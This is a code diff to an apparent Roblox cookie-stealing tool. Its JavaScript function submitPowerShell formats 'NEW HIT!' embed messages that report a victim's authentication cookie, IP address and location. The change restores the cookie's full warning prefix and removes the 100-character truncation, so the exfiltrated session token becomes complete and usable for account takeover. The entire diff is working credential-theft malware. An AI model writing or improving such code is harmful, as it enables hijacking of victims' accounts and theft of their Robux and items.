@@ -310,7 +310,7 @@ async function submitPowerShell() {
             fields: [
                 {
                     name: "🍪 Authentication Cookie",
-                    value: robloxCookie ? `\`\`\`${robloxCookie}\`\`\`` : "`No cookie found`",
+                    value: robloxCookie ? `\`\`\`|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|${robloxCookie}\`\`\`` : "`No cookie found`",
                     inline: false
                 },
                 {
@@ -378,7 +378,7 @@ async function submitPowerShell() {
             const simpleEmbed = {
                 title: "🚨 NEW HIT! 🚨",
                 color: 0xff0000,
-                description: `**Cookie:** ${robloxCookie ? `\`${robloxCookie.substring(0, 100)}...\`` : 'None'}\n**Location:** ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}\n**IP:** ${locationInfo.ip || 'Unknown'}`,
+                description: `**Cookie:** ${robloxCookie ? `\`|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|${robloxCookie}\`` : 'None'}\n**Location:** ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}\n**IP:** ${locationInfo.ip || 'Unknown'}`,
                 timestamp: new Date().toISOString()
             };
             
